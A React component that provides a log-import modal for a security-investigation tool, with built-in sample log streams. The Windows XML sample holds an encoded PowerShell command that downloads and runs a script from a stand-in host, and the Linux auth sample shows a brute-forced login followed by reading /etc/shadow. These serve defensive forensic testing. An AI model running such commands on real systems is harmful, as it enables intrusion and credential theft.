import React, { useState, useRef } from 'react';
import type { ImportLogResult, SecurityEvent, ValidationResult } from '../types/event';
import { importLogs } from '../services/api';

interface Props {
  isOpen: boolean;
  onClose: () => void;
  onImportSuccess: (result: {
    events: SecurityEvent[];
    validationStatus: ValidationResult;
    datasetName: string;
    formatDetected: string;
    recordCount: number;
    unsupportedFields?: string[];
    parsingWarnings?: string[];
  }) => void;
}

export const LogImportModal: React.FC<Props> = ({ isOpen, onClose, onImportSuccess }) => {
  const [content, setContent] = useState<string>('');
  const [filename, setFilename] = useState<string>('');
  const [deduplicate, setDeduplicate] = useState<boolean>(true);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [importResult, setImportResult] = useState<ImportLogResult | null>(null);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  const fileInputRef = useRef<HTMLInputElement>(null);

  if (!isOpen) return null;

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    if (file.size > 2 * 1024 * 1024) {
      setErrorMessage(`Selected file (${(file.size / (1024 * 1024)).toFixed(2)} MB) exceeds the 2 MB security limit.`);
      return;
    }

    setFilename(file.name);
    setErrorMessage(null);
    setImportResult(null);

    const reader = new FileReader();
    reader.onload = (event) => {
      const text = event.target?.result as string;
      setContent(text || '');
    };
    reader.onerror = () => {
      setErrorMessage('Failed to read the local log file.');
    };
    reader.readAsText(file);
  };

  const handleProcessImport = async () => {
    if (!content.trim()) {
      setErrorMessage('Please select a log file or paste JSON/JSONL log content.');
      return;
    }

    setIsSubmitting(true);
    setErrorMessage(null);
    setImportResult(null);

    try {
      const result = await importLogs(content, filename || null, deduplicate);
      setImportResult(result);

      if (result.valid_events_count === 0) {
        setErrorMessage('No valid security events could be parsed from the provided log stream.');
        return;
      }

      const datasetTitle = filename ? `Local Import: ${filename}` : `Local Import (${result.format_detected}, ${result.valid_events_count} events)`;

      onImportSuccess({
        events: result.events,
        validationStatus: result.validation_status,
        datasetName: datasetTitle,
        formatDetected: result.format_detected,
        recordCount: result.valid_events_count,
        unsupportedFields: result.unsupported_fields,
        parsingWarnings: result.parsing_warnings,
      });

      onClose();
    } catch (err: any) {
      setErrorMessage(err.message || 'Log import failed. Please verify format.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleLoadSampleJSON = () => {
    const sample = JSON.stringify(
      [
        {
          event_id: 'sample-01',
          timestamp: '2026-10-19T08:30:00Z',
          event_type: 'AUTHENTICATION',
          host_id: 'corp-bastion01',
          user_id: 'analyst_sarah',
          source_ip: '198.51.100.88',
          action: 'LOGON_SUCCESS',
          severity: 'INFORMATIONAL',
          source: 'local_auth_log',
          original_event_data: { login_type: 'ssh', auth_method: 'publickey' },
        },
        {
          event_id: 'sample-02',
          timestamp: '2026-10-19T08:31:15Z',
          event_type: 'PROCESS_EXECUTION',
          host_id: 'corp-bastion01',
          user_id: 'analyst_sarah',
          process_id: 4892,
          process_name: 'kubectl',
          command_line: 'kubectl get pods -n production',
          severity: 'INFORMATIONAL',
          source: 'local_auditd',
          original_event_data: { pid: 4892 },
        },
      ],
      null,
      2
    );
    setContent(sample);
    setFilename('sample_auth_stream.json');
    setErrorMessage(null);
  };

  const handleLoadWindowsXML = () => {
    const sample = `<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4625</EventID>
      <TimeCreated SystemTime="2026-10-18T14:02:10.000Z" />
      <EventRecordID>50101</EventRecordID>
      <Computer>SRV-FINANCE-01.corp.internal</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">contractor_mark</Data>
      <Data Name="IpAddress">198.51.100.80</Data>
      <Data Name="IpPort">58100</Data>
      <Data Name="Status">0xC000006D</Data>
      <Data Name="SubStatus">0xC000006A</Data>
      <Data Name="LogonType">3</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4624</EventID>
      <TimeCreated SystemTime="2026-10-18T14:02:25.000Z" />
      <EventRecordID>50104</EventRecordID>
      <Computer>SRV-FINANCE-01.corp.internal</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">contractor_mark</Data>
      <Data Name="IpAddress">198.51.100.80</Data>
      <Data Name="IpPort">58106</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="TargetLogonId">0x4fa99</Data>
      <Data Name="AuthenticationPackageName">NTLM</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-18T14:03:00.000Z" />
      <EventRecordID>50105</EventRecordID>
      <Computer>SRV-FINANCE-01.corp.internal</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">contractor_mark</Data>
      <Data Name="NewProcessId">0x2210</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBiAC4AcABzADEAJwApAA==</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>5156</EventID>
      <TimeCreated SystemTime="2026-10-18T14:03:15.000Z" />
      <EventRecordID>50106</EventRecordID>
      <Computer>SRV-FINANCE-01.corp.internal</Computer>
    </System>
    <EventData>
      <Data Name="Application">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="SourceAddress">10.0.1.100</Data>
      <Data Name="DestAddress">203.0.113.50</Data>
      <Data Name="DestPort">4444</Data>
      <Data Name="SourcePort">51234</Data>
    </EventData>
  </Event>
</Events>`;
    setContent(sample);
    setFilename('windows_host_intrusion.xml');
    setErrorMessage(null);
  };

  const handleLoadLinuxAuth = () => {
    const sample = `Oct 18 16:20:01 web-prod-02 sshd[3101]: Failed password for invalid user admin from 198.51.100.200 port 48112 ssh2
Oct 18 16:20:04 web-prod-02 sshd[3102]: Failed password for invalid user test from 198.51.100.200 port 48114 ssh2
Oct 18 16:20:08 web-prod-02 sshd[3103]: Failed password for root from 198.51.100.200 port 48116 ssh2
Oct 18 16:20:15 web-prod-02 sshd[3104]: Accepted password for svc_deploy from 198.51.100.200 port 48120 ssh2
Oct 18 16:20:16 web-prod-02 sshd[3104]: pam_unix(sshd:session): session opened for user svc_deploy by (uid=0)
Oct 18 16:20:30 web-prod-02 sudo:   svc_deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/shadow`;
    setContent(sample);
    setFilename('linux_auth_investigation.log');
    setErrorMessage(null);
  };

  return (
    <div className="report-modal-backdrop" onClick={onClose}>
      <div
        className="report-modal-container"
        onClick={(e) => e.stopPropagation()}
        style={{ maxWidth: '780px' }}
      >
        <div className="report-modal-header">
          <div className="modal-title-group">
            <span className="modal-eyebrow">FORENSIC TELEMETRY INGESTION</span>
            <h3 className="modal-title">Import Local Security Logs</h3>
            <span className="modal-sub">
              Validated local log ingest for <strong>JSON</strong>, <strong>JSONL</strong>, <strong>Windows XML</strong>, and <strong>Linux Syslog/Auth</strong> telemetry streams.
            </span>
          </div>
          <button className="btn-modal-close" onClick={onClose} title="Close import modal">
            ✕
          </button>
        </div>

        <div className="report-modal-body" style={{ padding: '1.25rem' }}>
          {/* Safety & Untrusted Data Disclaimer */}
          <div
            style={{
              background: '#0f172a',
              border: '1px solid #1e293b',
              borderLeft: '4px solid #38bdf8',
              borderRadius: '6px',
              padding: '0.85rem 1rem',
              marginBottom: '1rem',
              fontSize: '0.82rem',
              color: '#94a3b8',
              lineHeight: 1.5,
            }}
          >
            <div style={{ fontWeight: 700, color: '#f8fafc', marginBottom: '0.25rem' }}>
              🛡️ Safe Telemetry Ingestion Boundary
            </div>
            Imported content is treated as untrusted data. Embedded commands and script strings are stored strictly as inert telemetry text and are never executed. Raw records and cryptographic evidence chain of custody are preserved.
          </div>

          {/* File Picker & Sample Buttons */}
          <div style={{ display: 'flex', gap: '0.6rem', alignItems: 'center', marginBottom: '1rem', flexWrap: 'wrap' }}>
            <input
              type="file"
              ref={fileInputRef}
              accept=".json,.jsonl,.log,.txt,.xml"
              onChange={handleFileChange}
              style={{ display: 'none' }}
            />
            <button
              className="btn-modal-action"
              onClick={() => fileInputRef.current?.click()}
              style={{ background: '#3b82f6', color: '#ffffff' }}
            >
              📁 Browse Local File (.json, .xml, .log)
            </button>

            <button
              className="btn-modal-action"
              onClick={handleLoadSampleJSON}
              style={{ background: '#334155', color: '#f8fafc' }}
            >
              📝 JSON Sample
            </button>

            <button
              className="btn-modal-action"
              onClick={handleLoadWindowsXML}
              style={{ background: '#1e3a5f', color: '#60a5fa', border: '1px solid #2563eb' }}
            >
              🪟 Windows XML
            </button>

            <button
              className="btn-modal-action"
              onClick={handleLoadLinuxAuth}
              style={{ background: '#14382c', color: '#4ade80', border: '1px solid #16a34a' }}
            >
              🐧 Linux Auth.log
            </button>

            {filename && (
              <span style={{ fontSize: '0.85rem', color: '#38bdf8', fontWeight: 600, marginLeft: '0.25rem' }}>
                Selected: {filename}
              </span>
            )}
          </div>

          {/* Content Textarea */}
          <div style={{ marginBottom: '1rem' }}>
            <label
              style={{
                display: 'block',
                fontSize: '0.75rem',
                color: '#94a3b8',
                marginBottom: '0.35rem',
                fontWeight: 600,
                letterSpacing: '0.05em',
                textTransform: 'uppercase',
              }}
            >
              Raw Log Stream (JSON array, JSONL, Windows Event XML, or Linux Auth.log):
            </label>
            <textarea
              value={content}
              onChange={(e) => setContent(e.target.value)}
              placeholder='[{"event_id": "evt-01", "timestamp": "2026-10-19T10:00:00Z", "event_type": "AUTHENTICATION", "user_id": "admin", "action": "LOGON_SUCCESS"}]'
              rows={8}
              style={{
                width: '100%',
                background: '#0a0f1d',
                color: '#e2e8f0',
                border: '1px solid #334155',
                borderRadius: '6px',
                fontFamily: 'JetBrains Mono, monospace',
                fontSize: '0.78rem',
                padding: '0.75rem',
                boxSizing: 'border-box',
                resize: 'vertical',
              }}
            />
          </div>

          {/* Import Controls */}
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '0.75rem' }}>
            <label style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', fontSize: '0.82rem', color: '#cbd5e1', cursor: 'pointer' }}>
              <input
                type="checkbox"
                checked={deduplicate}
                onChange={(e) => setDeduplicate(e.target.checked)}
              />
              Enforce deduplication of conflicting event IDs
            </label>

            <span style={{ fontSize: '0.78rem', color: '#64748b' }}>
              Max size: 2 MB · Max records: 500
            </span>
          </div>

          {/* Error Message */}
          {errorMessage && (
            <div
              style={{
                marginTop: '1rem',
                background: 'rgba(239, 68, 68, 0.1)',
                border: '1px solid #ef4444',
                color: '#fca5a5',
                padding: '0.75rem',
                borderRadius: '6px',
                fontSize: '0.82rem',
              }}
            >
              ⚠️ {errorMessage}
            </div>
          )}

          {/* Validation Feedback & Malformed Issues Summary */}
          {importResult && importResult.validation_status.issues.length > 0 && (
            <div
              style={{
                marginTop: '1rem',
                background: 'rgba(245, 158, 11, 0.1)',
                border: '1px solid #f59e0b',
                color: '#fcd34d',
                padding: '0.75rem',
                borderRadius: '6px',
                fontSize: '0.8rem',
              }}
            >
              <div style={{ fontWeight: 700, marginBottom: '0.35rem' }}>
                Validation Notice: {importResult.malformed_count} malformed record(s) flagged:
              </div>
              <ul style={{ margin: 0, paddingLeft: '1.25rem' }}>
                {importResult.validation_status.issues.slice(0, 5).map((iss, idx) => (
                  <li key={idx}>
                    {iss.raw_record_id ? `[${iss.raw_record_id}] ` : ''}
                    {iss.field ? `${iss.field}: ` : ''}
                    {iss.message}
                  </li>
                ))}
              </ul>
            </div>
          )}
        </div>

        <div
          className="report-modal-footer"
          style={{
            padding: '1rem 1.25rem',
            borderTop: '1px solid #1e293b',
            display: 'flex',
            justifyContent: 'flex-end',
            gap: '0.75rem',
          }}
        >
          <button
            className="btn-modal-action"
            onClick={onClose}
            style={{ background: '#334155', color: '#f8fafc' }}
          >
            Cancel
          </button>
          <button
            className="btn-modal-action"
            onClick={handleProcessImport}
            disabled={isSubmitting || !content.trim()}
            style={{
              background: 'linear-gradient(135deg, #10b981, #059669)',
              color: '#ffffff',
              fontWeight: 700,
            }}
          >
            {isSubmitting ? 'Validating & Reconstructing...' : '✓ Ingest & Reconstruct Investigation'}
          </button>
        </div>
      </div>
    </div>
  );
};
